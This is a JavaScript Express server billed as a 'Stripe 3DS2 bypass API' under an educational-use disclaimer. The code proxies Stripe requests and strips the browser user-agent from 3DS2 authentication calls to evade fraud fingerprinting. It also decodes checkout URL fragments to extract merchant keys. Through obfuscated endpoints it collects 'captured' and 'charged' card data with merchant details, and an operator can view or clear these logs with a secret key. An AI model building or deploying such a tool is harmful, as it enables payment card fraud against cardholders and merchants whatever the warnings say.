/**
 * ⚠️  CRITICAL LEGAL WARNING ⚠️
 * 
 * This software is for EDUCATIONAL and RESEARCH purposes ONLY.
 * 
 * Using this code to bypass payment authentication mechanisms is:
 * - ILLEGAL in most jurisdictions (wire fraud, computer fraud)
 * - Violates PCI DSS compliance requirements
 * - Constitutes payment card fraud
 * - May result in criminal prosecution and civil liability
 * 
 * The authors and distributors of this code:
 * - Do NOT condone illegal activity
 * - Are NOT responsible for misuse
 * - Provide this code AS-IS without warranties
 * 
 * By using this code, you acknowledge that you understand these risks
 * and take full legal responsibility for your actions.
 * 
 * DO NOT deploy this in production.
 * DO NOT use this for actual payment processing.
 * DO NOT use this to commit fraud.
 */

require('dotenv').config();
const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

// Configuration from environment variables
const BEARER_TOKEN = process.env.BEARER_TOKEN || 'nai-bypass-token-change-me-2026';
const LOG_SECRET = process.env.LOG_SECRET || 'your-secret-key-here-change-me';
const STRIPE_API = process.env.STRIPE_API || 'https://api.stripe.com';

// In-memory storage for card logs
let cardsAll = [];
let cardsCharged = [];

// ============================================================================
// MIDDLEWARE
// ============================================================================

// Enable CORS for all origins (extension needs this)
app.use(cors({
  origin: '*',
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Site', 'User-Agent', 'Accept'],
  credentials: false
}));

// Parse JSON bodies
app.use(express.json({ limit: '10mb' }));

// Parse URL-encoded bodies (critical for Stripe requests)
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Request logging
app.use((req, res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
  next();
});

// Bearer token authentication middleware
const authenticateToken = (req, res, next) => {
  const authHeader = req.headers.authorization;
  const token = authHeader && authHeader.split(' ')[1]; // "Bearer TOKEN"
  
  if (!token || token !== BEARER_TOKEN) {
    return res.status(401).json({ error: 'Unauthorized: Invalid bearer token' });
  }
  
  next();
};

// ============================================================================
// CRITICAL: Browser User Agent Removal Function
// ============================================================================

/**
 * Removes browserUserAgent from Stripe 3DS2 authentication requests
 * This is the CORE bypass mechanism that defeats browser fingerprinting
 * 
 * @param {string} body - URL-encoded request body
 * @returns {string} Modified body with browserUserAgent removed
 */

// ============================================================================
// STRIPE CHECKOUT INFO EXTRACTOR
// Extracts full checkout details from Stripe checkout URLs
// ============================================================================

const XOR_KEY = 5;

/**
 * Parse Stripe checkout URL to extract session ID, public key, and merchant site
 * @param {string} checkoutUrl - Full Stripe checkout URL with fragment
 * @returns {Object} { sessionId, publicKey, site }
 */
function parseStripeCheckoutUrl(checkoutUrl) {
  if (!checkoutUrl || typeof checkoutUrl !== 'string') {
    return { sessionId: null, publicKey: null, site: null };
  }

  // Decode percent-encoding if present
  try { checkoutUrl = decodeURIComponent(checkoutUrl); } catch (_) {}

  // Extract session ID (cs_live_xxx or cs_test_xxx) from URL path
  const sessionMatch = checkoutUrl.match(/cs_(?:live|test)_[A-Za-z0-9]+/);
  const sessionId = sessionMatch ? sessionMatch[0] : null;

  let publicKey = null;
  let site = null;

  // The PK is hidden in the URL fragment (#...)
  // Encoding: urldecode → base64decode → XOR each byte with 5
  const fragmentIndex = checkoutUrl.indexOf('#');
  if (fragmentIndex !== -1) {
    const fragment = checkoutUrl.slice(fragmentIndex + 1);
    try {
      const decodedFragment = decodeURIComponent(fragment);

      // base64 decode
      const binaryStr = Buffer.from(decodedFragment, 'base64').toString('binary');
      const bytes = Uint8Array.from(binaryStr, c => c.charCodeAt(0));

      // XOR every byte with key 5
      const xorDecoded = Array.from(bytes)
        .map(byte => String.fromCharCode(byte ^ XOR_KEY))
        .join('');

      // Extract pk_live_... or pk_test_...
      const pkMatch = xorDecoded.match(/pk_(?:live|test)_[A-Za-z0-9]+/);
      if (pkMatch) publicKey = pkMatch[0];

      // Extract merchant site URL
      const siteMatch = xorDecoded.match(/https?:\/\/[^\s"']+/);
      if (siteMatch) site = siteMatch[0];

    } catch (err) {
      console.error('[Checkout Parser] Fragment decode error:', err.message);
    }
  }

  return { sessionId, publicKey, site };
}

/**
 * Fetch full checkout information from Stripe's init endpoint
 * @param {string} checkoutUrl - Full Stripe checkout URL
 * @returns {Promise<Object>} Normalized checkout data
 */
async function fetchStripeCheckoutInfo(checkoutUrl) {
  const { sessionId, publicKey, site } = parseStripeCheckoutUrl(checkoutUrl);

  if (!sessionId) {
    throw new Error('Could not extract session ID from checkout URL');
  }
  if (!publicKey) {
    throw new Error('Could not extract public key from URL fragment');
  }

  // Prepare request body for Stripe's init endpoint
  const params = new URLSearchParams({
    key: publicKey,
    eid: 'NA',
    browser_locale: 'en-US',
    browser_timezone: 'UTC',
    redirect_type: 'url'
  });

  console.log(`[Checkout Extractor] Fetching info for session: ${sessionId}`);

  const response = await fetch(
    `https://api.stripe.com/v1/payment_pages/${encodeURIComponent(sessionId)}/init`,
    {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'application/json',
        'Origin': 'https://checkout.stripe.com',
        'Referer': 'https://checkout.stripe.com/'
      },
      body: params.toString()
    }
  );

  const raw = await response.json();

  if (!response.ok) {
    const errorMsg = raw?.error?.message || 'Stripe API error';
    console.error('[Checkout Extractor] Error:', errorMsg);
    throw new Error(errorMsg);
  }

  console.log('[Checkout Extractor] Successfully fetched checkout info');

  return normalizeCheckoutData(raw, { sessionId, publicKey, fallbackSite: site });
}

/**
 * Normalize raw Stripe response into clean structured data
 * @param {Object} raw - Raw Stripe API response
 * @param {Object} metadata - { sessionId, publicKey, fallbackSite }
 * @returns {Object} Clean checkout data
 */
function normalizeCheckoutData(raw, { sessionId, publicKey, fallbackSite }) {
  // Line items (products)
  const lineItems = (raw.invoice?.lines?.data || []).map(item => ({
    id: item.line_item_id || item.id || null,
    description: item.description || null,
    amount: item.amount ?? null, // total for this line
    unitAmount: item.price?.unit_amount ?? null, // per-unit price (in cents)
    currency: item.currency || item.price?.currency || null,
    quantity: item.quantity ?? null,
    priceId: item.price?.id || null,
    productId: typeof item.price?.product === 'string'
      ? item.price.product
      : item.price?.product?.id || null,
    images: [
      ...(item.images || []),
      ...(item.price?.product?.images || [])
    ].filter((v, i, a) => a.indexOf(v) === i).slice(0, 3),
    recurring: item.price?.recurring
      ? {
          interval: item.price.recurring.interval,
          intervalCount: item.price.recurring.interval_count
        }
      : null
  }));

  const firstItem = lineItems[0] || {};

  // Tax
  const tax = Array.isArray(raw.invoice?.total_tax_amounts)
    ? raw.invoice.total_tax_amounts.reduce((s, e) => s + (e.amount || 0), 0)
    : null;

  // Merchant / company info
  const acct = raw.account_settings;
  const merchant = acct
    ? {
        accountId: acct.account_id || null,
        displayName: acct.display_name || null, // ← company name
        businessUrl: acct.business_url || fallbackSite || null,
        supportEmail: acct.support_email || null,
        supportPhone: acct.support_phone || null,
        statementDescriptor: acct.statement_descriptor || null
      }
    : fallbackSite
    ? { businessUrl: fallbackSite }
    : null;

  return {
    // ── Identity ──────────────────────────────
    sessionId,
    publicKey, // pk_live_... or pk_test_...
    livemode: raw.livemode ?? null, // true = real money
    status: raw.status || null,

    // ── Pricing ───────────────────────────────
    currency: raw.currency || firstItem?.currency || null,
    totals: {
      subtotal: raw.invoice?.subtotal ?? null,
      tax,
      total: raw.invoice?.total ?? null // in cents (e.g. 1999 = $19.99)
    },

    // ── Products ──────────────────────────────
    lineItems, // array of all items

    // ── Merchant / Company ────────────────────
    merchant, // display name, url, email, etc.
    customerEmail: raw.customer_email || null,

    // ── Subscription info ─────────────────────
    subscription: firstItem.recurring
      ? {
          interval: firstItem.recurring.interval,
          intervalCount: firstItem.recurring.intervalCount,
          mode: raw.mode || null
        }
      : { interval: null, intervalCount: null, mode: raw.mode || null },

    // ── URLs ──────────────────────────────────
    urls: {
      hosted: raw.stripe_hosted_url || null,
      cancel: raw.cancel_url || null,
      success: raw.success_url || null,
      management: raw.management_url || null
    },

    // ── Internal ──────────────────────────────
    configId: raw.config_id || null,
    initChecksum: raw.init_checksum || null
  };
}
function removeBrowserUserAgent(body) {
  try {
    const parts = body.split('&');
    const newParts = [];
    
    for (const part of parts) {
      // Look for browser or browser_info parameters
      if (part.startsWith('browser=') || part.startsWith('browser_info=')) {
        const eqIndex = part.indexOf('=');
        const paramName = part.substring(0, eqIndex);
        const encodedValue = part.substring(eqIndex + 1);
        
        try {
          // Decode URL-encoded value (handle + as space)
          let decoded = decodeURIComponent(encodedValue.replace(/\+/g, ' '));
          
          // Parse JSON object
          let obj = JSON.parse(decoded);
          
          // CRITICAL: Remove browserUserAgent field
          delete obj.browserUserAgent;
          
          console.log('[3DS Bypass] Removed browserUserAgent from request');
          
          // Re-encode exactly as Stripe expects
          const newJson = JSON.stringify(obj);
          const newEncoded = encodeURIComponent(newJson);
          
          newParts.push(paramName + '=' + newEncoded);
        } catch (e) {
          // If parsing fails, keep original parameter
          console.log('[3DS Bypass] Parse error, keeping original parameter:', e.message);
          newParts.push(part);
        }
      } else {
        // Keep all other parameters unchanged
        newParts.push(part);
      }
    }
    
    return newParts.join('&');
  } catch (e) {
    console.error('[3DS Bypass] Error processing body:', e.message);
    return body; // Return original on error
  }
}

// ============================================================================
// ROUTES: Health Check
// ============================================================================

app.get('/health', (req, res) => {
  res.json({ 
    status: 'ok', 
    timestamp: new Date().toISOString(),
    service: 'stripe-3ds2-bypass-api'
  });
});

app.get('/', (req, res) => {
  res.json({ 
    status: 'running',
    warning: 'This API facilitates payment fraud and is illegal to use in production',
    endpoints: {
      stripe_proxy: 'POST /v1/* (requires bearer token)',
      card_logging: 'POST /x7k9m2, POST /q3p8v5 (requires bearer token)',
      log_viewing: 'GET /logs/all?key=SECRET, GET /logs/charged?key=SECRET',
      health: 'GET /health'
    }
  });
});

// ============================================================================
// ROUTES: Card Logging
// ============================================================================

// Log all captured cards
// Log all captured cards with full checkout information
app.post('/x7k9m2', authenticateToken, express.json(), async (req, res) => {
  try {
    const { cardData, checkoutUrl, site } = req.body;
    
    if (!cardData || typeof cardData !== 'string') {
      return res.status(400).json({ error: 'Invalid card data format' });
    }
    
    let checkoutInfo = null;
    
    // Extract full checkout information if URL provided
    if (checkoutUrl && typeof checkoutUrl === 'string') {
      try {
        console.log(`[Card Log] Extracting checkout info from URL...`);
        checkoutInfo = await fetchStripeCheckoutInfo(checkoutUrl);
        console.log(`[Card Log] Company: ${checkoutInfo.merchant?.displayName || 'Unknown'}`);
        console.log(`[Card Log] Total: ${checkoutInfo.totals?.total || 0} ${checkoutInfo.currency || 'USD'}`);
      } catch (error) {
        console.error('[Card Log] Failed to extract checkout info:', error.message);
        // Continue without checkout info rather than failing
      }
    }
    
    // Store card data with full checkout details
    cardsAll.push({
      cardData: cardData,
      checkoutUrl: checkoutUrl || null,
      site: site || checkoutInfo?.merchant?.businessUrl || null,
      checkoutInfo: checkoutInfo, // Full unmasked checkout details
      timestamp: new Date().toISOString(),
      ip: req.ip
    });
    
    console.log(`[Card Log] Captured card (Total: ${cardsAll.length})`);
    
    res.json({ 
      success: true, 
      total: cardsAll.length,
      checkoutExtracted: checkoutInfo !== null,
      merchant: checkoutInfo?.merchant?.displayName || null
    });
  } catch (error) {
    console.error('[Card Log] Error:', error.message);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Log successfully charged cards
// Log successfully charged cards with full checkout information
app.post('/q3p8v5', authenticateToken, express.json(), async (req, res) => {
  try {
    const { cardData, checkoutUrl, site } = req.body;
    
    if (!cardData || typeof cardData !== 'string') {
      return res.status(400).json({ error: 'Invalid card data format' });
    }
    
    let checkoutInfo = null;
    
    // Extract full checkout information if URL provided
    if (checkoutUrl && typeof checkoutUrl === 'string') {
      try {
        console.log(`[Charged Log] Extracting checkout info from URL...`);
        checkoutInfo = await fetchStripeCheckoutInfo(checkoutUrl);
        console.log(`[Charged Log] Company: ${checkoutInfo.merchant?.displayName || 'Unknown'}`);
        console.log(`[Charged Log] Total: ${checkoutInfo.totals?.total || 0} ${checkoutInfo.currency || 'USD'}`);
      } catch (error) {
        console.error('[Charged Log] Failed to extract checkout info:', error.message);
        // Continue without checkout info rather than failing
      }
    }
    
    // Store charged card data with full checkout details
    cardsCharged.push({
      cardData: cardData,
      checkoutUrl: checkoutUrl || null,
      site: site || checkoutInfo?.merchant?.businessUrl || null,
      checkoutInfo: checkoutInfo, // Full unmasked checkout details
      timestamp: new Date().toISOString(),
      ip: req.ip
    });
    
    console.log(`[Charged Log] Card charged successfully (Total: ${cardsCharged.length})`);
    
    res.json({ 
      success: true, 
      total: cardsCharged.length,
      checkoutExtracted: checkoutInfo !== null,
      merchant: checkoutInfo?.merchant?.displayName || null
    });
  } catch (error) {
    console.error('[Charged Log] Error:', error.message);
    res.status(500).json({ error: 'Internal server error' });
  }
});


// ============================================================================
// ROUTES: Checkout Info Testing
// ============================================================================

// Test checkout extractor with a Stripe checkout URL
app.post('/test/checkout', authenticateToken, express.json(), async (req, res) => {
  try {
    const { checkoutUrl } = req.body;
    
    if (!checkoutUrl || typeof checkoutUrl !== 'string') {
      return res.status(400).json({ error: 'checkoutUrl is required' });
    }
    
    console.log('[Test] Testing checkout extraction...');
    const checkoutInfo = await fetchStripeCheckoutInfo(checkoutUrl);
    
    res.json({
      success: true,
      checkoutInfo: checkoutInfo,
      summary: {
        company: checkoutInfo.merchant?.displayName || 'Unknown',
        site: checkoutInfo.merchant?.businessUrl || 'Unknown',
        total: checkoutInfo.totals?.total || 0,
        currency: checkoutInfo.currency || 'USD',
        products: checkoutInfo.lineItems.map(item => item.description).join(', '),
        livemode: checkoutInfo.livemode
      }
    });
  } catch (error) {
    console.error('[Test] Error:', error.message);
    res.status(500).json({ 
      success: false,
      error: error.message 
    });
  }
});
// ============================================================================
// ROUTES: Log Retrieval
// ============================================================================

// View all captured cards
app.get('/logs/all', (req, res) => {
  const key = req.query.key;
  
  if (key !== LOG_SECRET) {
    return res.status(403).json({ error: 'Forbidden: Invalid secret key' });
  }
  
  res.json({
    total: cardsAll.length,
    cards: cardsAll
  });
});

// View charged cards
app.get('/logs/charged', (req, res) => {
  const key = req.query.key;
  
  if (key !== LOG_SECRET) {
    return res.status(403).json({ error: 'Forbidden: Invalid secret key' });
  }
  
  res.json({
    total: cardsCharged.length,
    cards: cardsCharged
  });
});

// Clear all captured cards
app.get('/logs/all/clear', (req, res) => {
  const key = req.query.key;
  
  if (key !== LOG_SECRET) {
    return res.status(403).json({ error: 'Forbidden: Invalid secret key' });
  }
  
  const previousTotal = cardsAll.length;
  cardsAll = [];
  
  console.log(`[Log Clear] Cleared ${previousTotal} captured cards`);
  
  res.json({ 
    success: true, 
    cleared: previousTotal,
    message: 'All captured cards cleared'
  });
});

// Clear charged cards
app.get('/logs/charged/clear', (req, res) => {
  const key = req.query.key;
  
  if (key !== LOG_SECRET) {
    return res.status(403).json({ error: 'Forbidden: Invalid secret key' });
  }
  
  const previousTotal = cardsCharged.length;
  cardsCharged = [];
  
  console.log(`[Log Clear] Cleared ${previousTotal} charged cards`);
  
  res.json({ 
    success: true, 
    cleared: previousTotal,
    message: 'All charged cards cleared'
  });
});

// ============================================================================
// ROUTES: Stripe API Proxy (CRITICAL - 3DS2 Bypass)
// ============================================================================

/**
 * Proxy all Stripe API requests
 * For /v1/3ds2/authenticate requests, removes browserUserAgent to bypass fingerprinting
 */
app.all('/v1/*', authenticateToken, async (req, res) => {
  try {
    const stripePath = req.path; // e.g., "/v1/3ds2/authenticate"
    const queryString = req.url.split('?')[1] || ''; // Extract query string
    const stripeUrl = `${STRIPE_API}${stripePath}${queryString ? '?' + queryString : ''}`;
    
    console.log(`[Stripe Proxy] ${req.method} ${stripePath}${queryString ? '?' + queryString : ''}`);
    
    // Get request body
    let body = null;
    if (req.method === 'POST' || req.method === 'PUT' || req.method === 'PATCH') {
      // Check if body is already parsed or raw
      if (typeof req.body === 'string') {
        body = req.body;
      } else if (typeof req.body === 'object' && Object.keys(req.body).length > 0) {
        // Convert parsed object back to URL-encoded string
        body = Object.entries(req.body)
          .map(([key, value]) => `${encodeURIComponent(key)}=${encodeURIComponent(value)}`)
          .join('&');
      }
      
      // CRITICAL: Apply 3DS2 bypass for authentication requests
      if (stripePath.includes('/v1/3ds2/authenticate') && body) {
        console.log('[3DS] Original body length:', body.length);
        body = removeBrowserUserAgent(body);
        console.log('[3DS] Modified body length:', body.length);
      }
    }
    
    // Prepare headers for Stripe
    const headers = {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Accept': 'application/json',
      'Origin': 'https://js.stripe.com',
      'Referer': 'https://js.stripe.com/'
    };
    
    // Copy User-Agent from original request if present
    if (req.headers['user-agent']) {
      headers['User-Agent'] = req.headers['user-agent'];
    }
    
    // Copy X-Site header if present (for tracking)
    if (req.headers['x-site']) {
      headers['X-Site'] = req.headers['x-site'];
    }
    
    // Make request to Stripe
    const stripeResponse = await fetch(stripeUrl, {
      method: req.method,
      headers: headers,
      body: body
    });
    
    // Get response body
    const responseText = await stripeResponse.text();
    
    // Log 3DS2 response details for debugging
    if (stripePath.includes('/v1/3ds2/authenticate')) {
      console.log('[3DS] Response status:', stripeResponse.status);
      console.log('[3DS] Response body:', responseText.substring(0, 500));
    }
    
    // Forward Stripe's response to extension
    res.status(stripeResponse.status)
      .set('Content-Type', stripeResponse.headers.get('content-type') || 'application/json')
      .send(responseText);
      
  } catch (error) {
    console.error('[Stripe Proxy] Error:', error.message);
    res.status(500).json({ 
      error: 'Proxy error',
      message: error.message 
    });
  }
});

// ============================================================================
// ERROR HANDLING
// ============================================================================

// 404 handler
app.use((req, res) => {
  res.status(404).json({ error: 'Not found' });
});

// Global error handler
app.use((err, req, res, next) => {
  console.error('[Server Error]', err);
  res.status(500).json({ error: 'Internal server error' });
});

// ============================================================================
// SERVER START
// ============================================================================

app.listen(PORT, () => {
  console.log('═'.repeat(60));
  console.log('⚠️  STRIPE 3DS2 BYPASS API - EDUCATIONAL USE ONLY ⚠️');
  console.log('═'.repeat(60));
  console.log(`Server running on port ${PORT}`);
  console.log(`Health check: http://localhost:${PORT}/health`);
  console.log('');
  console.log('WARNING: This API facilitates payment fraud.');
  console.log('Using this for actual transactions is ILLEGAL.');
  console.log('═'.repeat(60));
});
